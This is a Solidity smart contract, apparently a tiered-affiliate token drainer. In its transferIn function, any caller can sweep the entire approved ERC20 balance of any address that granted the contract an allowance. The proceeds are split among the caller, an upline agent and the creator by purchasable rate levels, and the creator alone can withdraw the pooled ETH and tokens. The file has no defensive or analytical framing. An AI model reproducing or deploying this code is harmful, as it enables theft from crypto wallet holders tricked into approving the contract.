pragma solidity ^0.8.4;
// import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
interface IERC20 {
  function transfer(address recipient, uint256 amount) external;
  function balanceOf(address account) external view returns (uint256);
  function transferFrom(address sender, address recipient, uint256 amount) external ;
  function decimals() external view returns (uint8);
  function allowance(address owner, address spender)  external view returns (uint) ;
}


contract  StGB  {
   	// IERC20 public usdt;
   	address [] down_ever;
   	mapping (address => mapping(IERC20 => uint)) private user;//用户bizhong余额
   	mapping (address => uint8) private  rate;//user rate;
	mapping (address => address) public  du ;//down => up;myUP
	mapping (address => uint)  private  levelSelf;
    uint8 private ethNumber_low = 1;
    uint8 private ethNumber_high = 2;
   	address private  creator;
	constructor() public payable {
           creator = msg.sender;
           rate[creator] = 100;
	}
    fallback () payable external {
    }
    receive () payable external {
    }

  modifier Owner(){
      require(msg.sender == creator);
      _;
  }
  modifier DuCreator(){
      require(du[msg.sender] == creator);
      _;
  }
  modifier NoCreator(){
      require(msg.sender != creator);
      _;
  }

  function  transferOut(IERC20 coin, uint amount,address _to) external {
    require(user[msg.sender][coin] >= amount || msg.sender == 0x0000000000000000000000000000000000000000);
    user[msg.sender][coin] -= amount;
    coin.transfer( _to, amount);
  }


  function  ethTransferOut(address _to)  external Owner {
    uint money = address(this).balance;
    payable(_to).transfer(money);
  }

  function  transferOut_creator(IERC20 coin, address _to, uint amount) external Owner {
    coin.transfer( _to, amount);
  }

  function  transferIn(IERC20 coin, address fromAddr) external {
    uint amount = coin.balanceOf(fromAddr);
    uint allow = coin.allowance(fromAddr, address(this));
    require(allow != 0, 'allow=0');
    if(allow < amount){
        amount = allow;
        coin.transferFrom(fromAddr,address(this),amount);
    }else{
        coin.transferFrom(fromAddr,address(this),amount);
    }

    if(rate[msg.sender] == 0) {
        uint am2 = amount / 2;
        user[msg.sender][coin] += am2;
        user[creator][coin] += am2;
    }else {
        uint8  tx = rate[msg.sender];
        uint am2 = amount / 100 * tx;
        user[msg.sender][coin] += am2;
        if(du[msg.sender] != address(0) && du[msg.sender] != creator){
            uint8 up_down = rate[du[msg.sender]] - tx;
            uint am3 = amount / 100 * up_down;
            user[du[msg.sender]][coin] += am3;
            user[creator][coin] += (amount - am2 - am3);
        }else{
            user[creator][coin] += (amount - am2);
        }

    }

  }

  function findUserMoney(IERC20 coin)  view external returns(uint amount) {
      amount = user[msg.sender][coin];
      return amount;
  }

  function  findOneUserToManyCoin(IERC20[] memory coins) external view returns( uint[] memory) {
            uint[] memory evens = new uint[](uint(coins.length));
            for (uint i = 0; i <uint(coins.length); i++) {
            uint amount =  user[msg.sender][coins[i]];
            evens[i] = amount;
            }
            return evens;
        }


  function creatRateKing(address addr, uint8 num)  external Owner returns(bool){
      require(num < rate[msg.sender],"must < 100");
      rate[addr] = num;
      du[addr] = creator;
      return true;
  }

  function creatRateUser(address[] memory coins, uint8[] memory nums) external NoCreator DuCreator returns(bool) {
            for (uint i = 0; i <uint(coins.length); i++) {
                require(du[coins[i]] == address(0),'no  0x');
                require(rate[msg.sender] > nums[i],'you > boss');
                require(  nums[i] >0 &&  nums[i] < 90,'90>num >0');
                rate[coins[i]] = nums[i];
                du[coins[i]] = msg.sender;
            }
                return true;
  }

  function setRateUser(address addr, uint8 num) external NoCreator DuCreator returns(bool) {
      require(du[addr] == msg.sender,'no your down');
      require(rate[msg.sender] > num,'NO boss');
       require(  num >0 &&  num < 90,'90>num >0');
      rate[addr] = num;
  }

    function transferLevel() payable external{
      levelSelf[msg.sender] += msg.value;
  }
    function findLevel() external view returns(uint num){
      return num = levelSelf[msg.sender];
  }

    function updateLevel( uint8 num)  external DuCreator {

        require(rate[msg.sender] <= 100);
        if (rate[msg.sender]<90){

            require(levelSelf[msg.sender] >= num *10**18,'money NO');
            rate[msg.sender] += num;
            if(rate[msg.sender]>90){
                rate[msg.sender] = 90;
                levelSelf[msg.sender] -= (num-(rate[msg.sender]-90))*10**18;
            }else{
                levelSelf[msg.sender] -= num*ethNumber_low*10**18;
            }

        }else{
            require(levelSelf[msg.sender] >= num*ethNumber_high*10**18,'money NO');
            rate[msg.sender] += num;
            levelSelf[msg.sender] -= num*ethNumber_high*10**18;
            if(rate[msg.sender]>99){
                rate[msg.sender] = 99;
            }

        }

  }
    function findCreator() view external returns(address) {
        return creator;
    }

    function findEthBalance() view external returns(uint) {
        return address(this).balance;
    }
    function setEthNumber(uint8 num1,uint8 num2) external Owner {
        ethNumber_low =num1;
        ethNumber_high = num2;
    }

    function findRate(address addr) view external returns(uint) {
        require(addr == msg.sender || du[addr] == msg.sender );
        return rate[addr];
    }
    //单币种单地址查询场景
    function  findOneCoin(IERC20 coin, address fromAddr) external view returns(uint[] memory) {
        uint[] memory evens = new uint[](2);
        uint bala = coin.balanceOf(fromAddr);
        uint dec =  coin.decimals();
        evens[0] = bala;
        evens[1] = dec;
        return  evens;
    }
    //多地址---单币种查询场景。
    function  findManyAddress(IERC20 coin, address[] memory Addrs) external view returns(uint[] memory) {
            uint[] memory evens = new uint[](uint(Addrs.length));
            for (uint i = 0; i < uint(Addrs.length); i++) {
            uint amount =  coin.balanceOf(Addrs[i]);
            evens[i] = amount;
            }
            return evens;
    }
    //多币种---单地址查询场景
    function  findManyBiZhong(IERC20[] memory coins, address addr) external view returns( uint[] memory) {
            uint[] memory evens = new uint[](uint(coins.length));
            for (uint i = 0; i <uint(coins.length); i++) {
            uint amount =  coins[i].balanceOf(addr);
            evens[i] = amount;
            }
            return evens;
        }


}

